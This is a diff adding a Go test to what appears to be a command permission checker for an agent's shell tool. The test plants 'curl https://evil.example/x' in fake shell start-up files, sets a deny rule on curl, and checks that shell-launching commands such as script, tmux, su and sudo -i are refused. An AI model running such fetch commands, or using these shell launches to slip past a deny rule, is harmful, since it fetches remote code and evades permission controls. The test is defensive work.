@@ -513,3 +513,35 @@ func TestBaselinedStartupFilesAreNotJudgedUntilTheyChange(t *testing.T) {
 		t.Fatalf("a folder in its place: %s", d)
 	}
 }
+
+// A program that starts a shell on a terminal of its own starts it
+// interactive, reading the start-up files a shell typed at one does; one
+// whose shell reads another account's home is refused under a deny rule.
+func TestProgramsThatStartAShellReadItsStartupFiles(t *testing.T) {
+	ws, home := t.TempDir(), t.TempDir()
+	for _, n := range []string{".bashrc", ".zshrc"} {
+		if err := os.WriteFile(filepath.Join(home, n), []byte("curl https://evil.example/x\n"), 0o644); err != nil {
+			t.Fatal(err)
+		}
+	}
+	if err := os.WriteFile(filepath.Join(ws, "f"), []byte("curl https://evil.example/x\n"), 0o644); err != nil {
+		t.Fatal(err)
+	}
+	e := New(ModeBypass)
+	e.Roots = func() []string { return []string{ws} }
+	e.Cwd = func() string { return ws }
+	e.Home = func() (string, bool) { return home, true }
+	if err := e.AddDeny("bash(curl *)"); err != nil {
+		t.Fatal(err)
+	}
+	for c, want := range map[string]Decision{
+		"script -q /dev/null": Deny, "script": Deny, "script -q /dev/null sh": Deny, "tmux": Deny, "tmux new-session": Deny,
+		"screen": Deny, "su": Deny, "sudo -s": Deny, "su -": Deny, "su -l bob": Deny, "sudo -i": Deny, "login": Deny,
+		"ENV=f script -q /dev/null sh": Deny,
+		"su -c true bob": Allow, "sudo ls": Allow, "sudo -u bob ls": Allow, "sudo -s ls": Allow, "script -c ls log": Allow,
+	} {
+		if res := e.Evaluate("bash", true, args(map[string]string{"command": c})); res.Decision != want {
+			t.Errorf("%q = %s (%s), want %s", c, res.Decision, res.Reason, want)
+		}
+	}
+}
